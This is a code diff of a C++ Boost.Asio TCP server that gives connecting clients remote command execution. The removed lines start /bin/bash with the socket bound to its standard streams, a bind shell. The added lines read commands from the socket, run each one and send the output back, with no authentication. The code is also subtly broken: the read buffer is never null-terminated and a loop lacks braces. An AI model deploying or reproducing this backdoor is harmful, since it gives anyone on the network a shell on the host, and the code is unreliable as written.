@@ -1,13 +1,14 @@
 #include <cstdlib>
 #include <iostream>
 #include <thread>
+#include <string>
 #include <utility>
+
 #include <boost/asio.hpp>
 #include <boost/process.hpp>
-#include <unistd.h>
 
-using namespace boost::process;
 using boost::asio::ip::tcp;
+using namespace boost::process;
 
 const int max_length = 1024;
 
@@ -15,20 +16,34 @@ void session(tcp::socket sock)
 {
   try
   {
-    dup2(sock.native_handle(), 0);
-    dup2(sock.native_handle(), 1);
-    dup2(sock.native_handle(), 2);
-    
-    ipstream pipe_stream;
-    child c("/bin/bash", std_out > pipe_stream);
+    for (;;)
+    {
+      char data[max_length];
 
-    std::string line;
+      boost::system::error_code error;
+      size_t length = sock.read_some(boost::asio::buffer(data), error);
+      if (error == boost::asio::error::eof)
+        break; // Connection closed cleanly by peer.
+      else if (error)
+        throw boost::system::system_error(error); // Some other error.
+     
+      std::string cmd (data);
+      cmd.pop_back();
 
-    while (pipe_stream && std::getline(pipe_stream, line) && !line.empty())
-        std::cerr << line << std::endl;
+      ipstream pipe_stream;
+      child c(cmd, std_out > pipe_stream);
 
-    c.wait();
+      std::string out = "";
+      std::string line;
 
+      while (pipe_stream && std::getline(pipe_stream, line) && !line.empty())
+          out += line;
+          out += "\n";
+
+      c.wait();
+
+      boost::asio::write(sock, boost::asio::buffer(out, out.size()));
+    }
   }
   catch (std::exception& e)
   {
